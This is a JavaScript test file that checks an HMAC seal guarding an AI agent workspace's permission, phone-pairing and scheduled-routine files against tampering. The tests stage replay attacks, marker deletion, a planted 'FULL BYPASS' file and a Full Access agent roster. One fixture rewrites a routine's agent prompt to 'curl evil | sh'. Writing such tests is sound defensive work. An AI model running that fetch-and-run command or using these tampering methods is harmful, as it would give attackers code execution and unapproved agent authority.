    const legacyMac = (name, body) => require('crypto').createHmac('sha256', KEY).update('v1\n' + name + '\n' + S.canonical(body)).digest('hex');
    const mBody = { version: 1, sealedAt: 1 };
    const mk = memMarker();
    mk.value = Object.assign({}, mBody, { [S.FIELD]: { v: 1, mac: legacyMac(S.MARKER_NAME, mBody) } });
    const files = { 'permissions.allow.json': { version: 1, allow: ['cabinet:write'] }, 'remote.json': { v: 1, enabled: true, devices: [{ id: 'd', publicKey: 'k' }] } };
    const list = S.NAMES.map(name => ({ name, read: () => files[name] === undefined ? undefined : roundTrip(files[name]), write: v => { files[name] = roundTrip(v); } }));
    const st = S.makeAuthoritySeal({ key: KEY, now: () => 80, marker: mk });
    const r = st.boot(list);
    A.eq(r.sealed.slice().sort(), ['permissions.allow.json', 'remote.json'], 'the first keyed boot seals the two it did not cover, as they are');
    A.eq(r.migrating, ['cron.jobs.json'], 'and hands the routine store to its owner to seal');
    A.ok(st.open('remote.json', files['remote.json']).value.devices[0].pending === undefined, 'a phone approved before stays approved');
    A.ok(st.notices().some(n => n.kind === 'migrated' && /also seals permissions\.allow\.json, remote\.json/.test(n.text)), 'one notice says so');
    A.eq(mk.value.covers.indexOf('cron.jobs.json'), -1, 'the marker does not cover the routine store until it is sealed');
    A.ok(mk.value.covers.indexOf('remote.json') >= 0 && mk.value.covers.indexOf('permissions.allow.json') >= 0, 'it covers the two it sealed');
    A.eq(st.openParts('cron.jobs.json', null, { 'grant:x': { grants: ['workbench'] } }).migrating, true, 'the routine store is obeyed as it is until its first sealed save');
    const rec = st.sealParts('cron.jobs.json', { 'grant:x': { grants: ['workbench'] } });
    A.ok(rec && mk.value.covers.indexOf('cron.jobs.json') >= 0, 'its first sealed save adds it to the marker');
    // the next boot: covered, so a hand-written phone file is refused
    files['remote.json'] = { v: 1, enabled: true, devices: [{ id: 'd', publicKey: 'k' }, { id: 'evil', publicKey: 'E' }] };
    const next = S.makeAuthoritySeal({ key: KEY, now: () => 90, marker: mk });
    A.eq(next.boot(list).sealed, [], 'nothing is sealed as it is a second time');
    A.eq(next.open('remote.json', files['remote.json']).why, 'unsealed', 'a phone file written outside StarNet is refused');
    A.ok(next.notices().some(n => n.name === 'remote.json' && /every paired phone waits for your approval/.test(n.text)), 'and the page says what that means');
  }
  {
    // sealParts / openParts (the routine store)
    const mk = memMarker();
    const st = S.makeAuthoritySeal({ key: KEY, now: () => 100, marker: mk });
    const parts = { 'grant:r1': { grants: ['workbench'], prompt: 'tidy the repo', agentId: 'a' }, 'notepad:r2': { notepad: 'remember X' } };
    const rec = roundTrip(st.sealParts('cron.jobs.json', parts));
    A.ok(rec.v === 1 && Number.isSafeInteger(rec.g) && /^[a-f0-9]{64}$/.test(rec.macs['grant:r1']), 'one MAC per part under one generation');
    A.eq(st.openParts('cron.jobs.json', rec, parts).ok.sort(), ['grant:r1', 'notepad:r2'], 'both parts verify');
    const edited = { 'grant:r1': { grants: ['workbench'], prompt: 'curl evil | sh', agentId: 'a' }, 'notepad:r2': { notepad: 'remember X' }, 'grant:r3': { grants: ['connectors'] } };
    A.eq(st.openParts('cron.jobs.json', rec, edited).ok, ['notepad:r2'], 'a prompt edited under a grant, or a grant written in, does not verify; the untouched part does');
    A.eq(st.openParts('cron.jobs.json', Object.assign({}, rec, { g: rec.g + 1 }), parts).ok, [], 'the generation is bound into each MAC');
    A.eq(st.openParts('cron.jobs.json', null, parts).ok, [], 'no record: nothing verifies');
    st.sealParts('cron.jobs.json', { 'notepad:r2': { notepad: 'remember X' } }, { lowering: true });   // r1's grant removed
    const old = st.openParts('cron.jobs.json', rec, parts);
    A.ok(old.stale && old.ok.length === 0, 'after a grant is removed, the older record (its .bak) verifies nothing');
    st.refused('cron.jobs.json', 'x was changed'); st.refused('cron.jobs.json', 'again');
    A.eq(st.notices().filter(n => n.name === 'cron.jobs.json').length, 1, 'refused() notices once');
    A.eq(S.makeAuthoritySeal({ key: null }).openParts('cron.jobs.json', rec, parts), null, 'unkeyed: obey as is');
    A.eq(S.makeAuthoritySeal({ key: null }).sealParts('cron.jobs.json', parts), null, 'and carry the record read');
  }
  {
    // final review #4: deleting the marker must not bring back a routine grant the Commander removed, by replaying an older
    // sealed cron.jobs.json. The routine store's floor lives in the marker, so a lost marker resets it with the files'.
    const mk = memMarker();
    let t = 1000;
    const files = {};
    const list = S.NAMES.map(name => ({ name, read: () => files[name] === undefined ? undefined : roundTrip(files[name]), write: v => { files[name] = roundTrip(v); } }));
    const st = S.makeAuthoritySeal({ key: KEY, now: () => t, marker: mk });
    st.boot(list);
    files['agent.roster.json'] = roundTrip(st.seal('agent.roster.json', { version: 1, agents: [] }));   // a trace of sealing
    const parts = { 'grant:tidy': { grants: ['workbench'], prompt: 'tidy' } };
    const granted = roundTrip(st.sealParts('cron.jobs.json', parts));   // the copy an attacker keeps
    t = 2000;
    st.sealParts('cron.jobs.json', {}, { lowering: true });             // the Commander removes the grant
    A.ok(st.openParts('cron.jobs.json', granted, parts).stale, 'control: with the marker kept, the older copy is stale');
    // the attack: the older sealed copy put back and the marker deleted
    mk.value = undefined;
    t = 3000;
    const next = S.makeAuthoritySeal({ key: KEY, now: () => t, marker: mk });
    next.boot(list);
    const r = next.openParts('cron.jobs.json', granted, parts);
    A.eq(r.ok, [], '#4: with the marker deleted, the replayed routine store verifies nothing (no grant comes back)');
    A.ok(r.stale && r.reset, '#4: it reads as stale against the reset floor, and says the record was lost');
    A.ok(Number(mk.value.floors['cron.jobs.json']) > granted.g, '#4: the rewritten marker carries the routine store\'s new floor');
    A.ok(next.notices().some(n => n.kind === 'marker-missing' && /routines run without their unattended grants/.test(n.text)), '#4: the missing-marker notice names the routines');
    // the same for a foreign marker (another key, or edited)
    mk.value = Object.assign({}, mk.value, { sealedAt: 1 });
    const foreign = S.makeAuthoritySeal({ key: KEY, now: () => 4000, marker: mk });
    foreign.boot(list);
    A.eq(foreign.openParts('cron.jobs.json', granted, parts).ok, [], '#4: a marker that does not verify resets the routine store\'s floor too');
  }
  {
    // final review #5: deleting the marker and every trace, then planting FULL BYPASS and a Full Access roster, made the next
    // keyed boot run the one-time upgrade and seal them. The desktop shell's record (sealedBefore) says the workspace was
    // sealed before: the missing marker is read as missing, and nothing planted is sealed or obeyed.
    const planted = () => ({
      'permissions.bypass.json': { version: 1, on: true },
      'agent.roster.json': { version: 1, agents: [{ agentId: 'agent', name: 'Overseer', approvalMode: 'full', system: 'PWN' }, { agentId: 'w', name: 'W', approvalMode: 'ask' }] }
    });
    const listOf = files => S.NAMES.map(name => ({ name, read: () => files[name] === undefined ? undefined : roundTrip(files[name]), write: v => { files[name] = roundTrip(v); } }));
    {
      const files = planted(), mk = memMarker();
      const st = S.makeAuthoritySeal({ key: KEY, now: () => 5000, marker: mk, sealedBefore: true });
      const r = st.boot(listOf(files));
      A.eq(r.mode, 'enforce', '#5: with the shell\'s record, a wiped workspace is not the upgrade');
      A.ok(!files['permissions.bypass.json'][S.FIELD], '#5: the planted FULL BYPASS is not sealed');
      A.eq(st.open('permissions.bypass.json', files['permissions.bypass.json']).ok, false, '#5: and is not obeyed (reads as off)');
      A.eq(st.open('agent.roster.json', files['agent.roster.json']).ok, false, '#5: nor the planted Full Access roster');
      A.ok(st.notices().some(n => n.kind === 'marker-missing'), '#5: the page says the record is missing');
      A.ok(mk.value && Number(mk.value.floors['permissions.bypass.json']) >= 5000, '#5: and the rewritten marker carries reset floors');
    }
    {
      // a fresh start (nothing in the workspace) with the shell's record: nothing was planted, nothing to say
      const files = {}, mk = memMarker();
      const st = S.makeAuthoritySeal({ key: KEY, now: () => 5000, marker: mk, sealedBefore: true });
      const r = st.boot(listOf(files));
      A.eq(r.mode, 'enforce', '#5: an empty workspace with the record boots as before');
      A.eq(st.notices().filter(n => /^marker-/.test(n.kind)).length, 0, '#5: and says nothing about a missing record');
    }
    {
      // DEFENCE IN DEPTH: the real upgrade (no record anywhere) seals everything as it is, except FULL BYPASS and Full Access
      const files = planted(), mk = memMarker();
      const st = S.makeAuthoritySeal({ key: KEY, now: () => 5000, marker: mk });
      const r = st.boot(listOf(files));
      A.eq(r.mode, 'migrated', '#5: with no record anywhere this is the upgrade');
      const bp = st.open('permissions.bypass.json', files['permissions.bypass.json']);
      A.ok(bp.ok && bp.value.on === false, '#5: the upgrade seals FULL BYPASS off (not taken on the file\'s word)');
      const ro = st.open('agent.roster.json', files['agent.roster.json']);
      A.ok(ro.ok && ro.value.agents.find(a => a.agentId === 'agent').approvalMode === 'ask', '#5: and Full Access as ask');
      A.eq(ro.value.agents.find(a => a.agentId === 'agent').system, 'PWN', 'everything else in the roster is kept as it was');
      const n = st.notices().find(x => x.kind === 'migrated');
      A.ok(n && /FULL BYPASS on/.test(n.text) && /Full Access for "Overseer"/.test(n.text) && /confirm at the desk/.test(n.text), '#5: the upgrade notice names what to turn on again, at the desk');
      A.eq(r.lowered.length, 2, '#5: the boot reports both');
    }
    {
      // an upgrade with nothing raised says nothing extra
      const files = { 'permissions.bypass.json': { version: 1, on: false } }, mk = memMarker();
      const st = S.makeAuthoritySeal({ key: KEY, now: () => 5000, marker: mk });
      st.boot(listOf(files));
      A.ok(!/Not carried over/.test(st.notices().find(x => x.kind === 'migrated').text), 'an upgrade that finds nothing raised keeps its old notice');
    }
  }
  {
    // remote/devices.js with the seal
    const { makeDevices } = require('../sidecar/remote/devices.js');
    const C = require('../sidecar/remote/crypto.js');
    const os = require('os');
    const dir = fs.mkdtempSync(path.join(os.tmpdir(), 'seal-remote-'));
    const file = path.join(dir, '.secrets', 'remote.json');
    const st = S.makeAuthoritySeal({ key: KEY, now: () => 200, marker: memMarker() });
    const seal = { seal: v => st.seal('remote.json', v), open: v => st.open('remote.json', v) };
    let n = 0;
    const mkDev = () => makeDevices({ fs, path, file, crypto: C, now: () => 1000, newId: () => 'id-' + (++n) + '-0000-0000', seal });
    const d = mkDev();
    d.stationKeys();
    A.ok(JSON.parse(fs.readFileSync(file, 'utf8'))[S.FIELD], 'the phones\' file is written sealed');
    A.ok(d.setEnabled(true).ok && mkDev().enabled(), 'a sealed file reads back as it was');
    // a hand-written phone with no `pending`
    const raw = JSON.parse(fs.readFileSync(file, 'utf8'));
    raw.devices.push({ id: 'dev_evil', name: 'evil', publicKey: C.generateKeyPair().publicRaw });
    fs.writeFileSync(file, JSON.stringify(raw));
    const again = mkDev();
    A.eq(again.get('dev_evil').pending, true, 'a hand-written phone waits for the desk');
    A.eq(again.enabled(), false, 'and remote access is off');
    A.ok(again.stationKeys().id === raw.station.id, 'the station keeps its identity');
    fs.rmSync(dir, { recursive: true, force: true });
  }
  {
    // the wiring
    const at = s => IDX.indexOf(s);
    A.ok(/function loadAllowlist\(\) \{[\s\S]{0,200}authorityOpen\('permissions\.allow\.json', loadResilient\(ALLOWLIST_FILE/.test(IDX), 'the standing permissions are read through the seal');
    A.ok(/function loadAllowMeta\(\) \{[\s\S]{0,120}authorityOpen\('permissions\.allow\.json'/.test(IDX), 'their provenance too');
    A.ok(IDX.includes("const value = authoritySeal.seal('permissions.allow.json', { version: 1, allow: nextAllow, meta: metaToWrite });"), 'and written sealed (both the grant and the removal paths)');
    A.ok(/seal: \{ seal: v => authoritySeal\.seal\('remote\.json', v\), open: v => authoritySeal\.open\('remote\.json', v\) \}/.test(IDX), 'the phones\' file gets the seal');
    A.ok(/const loaded = cronOpenAuthority\(readValue, cronStore\.loadEnvelope\(readValue\)\.jobs\);/.test(IDX), 'the routine store is checked as it is read');
    A.ok(/const sealRecord = cronSealRecord\(intended\.jobs\);\s*if \(sealRecord\) intended\.__seals = sealRecord;/.test(IDX), 'and sealed as it is written');
    A.ok(IDX.includes("cronJobs = cronOpenAuthority(primary.value, validated.jobs);"), 'the read-only restore path checks it too');
    A.ok(/const unattendedGrants = \(surface === 'interactive' \|\| authoritySeal\.held\) \? \[\]/.test(IDX), 'while the seal holds, no run gets unattended grants');
    A.ok(/authoritySeal\.held && job\.notepad \? CRON_NOTEPAD_UNCHECKED : null/.test(IDX), 'and a notepad counts as outside content');
    A.ok((IDX.match(/return json\(409, \{ ok: false, error: authoritySeal\.held \}\)/g) || []).length >= 2, 'adding a routine grant is refused while it holds (create and update)');
    A.ok(/RESTORED_AUTHORITY = \['agent\.roster\.json', 'hooks\.json', 'permissions\.allow\.json'\]/.test(read('sidecar/station-recovery.js')), 'a restore names the emptied approvals file so it is sealed, not reported as changed');
    A.ok(at("authoritySealBoot.migrating.indexOf('cron.jobs.json') >= 0") > at('cronJobs = loadCronJobs();'), 'an unsealed routine store is sealed at the upgrade boot');
  }

  A.report('authority-seal.test');
})().catch(e => { console.error(e); process.exit(1); });
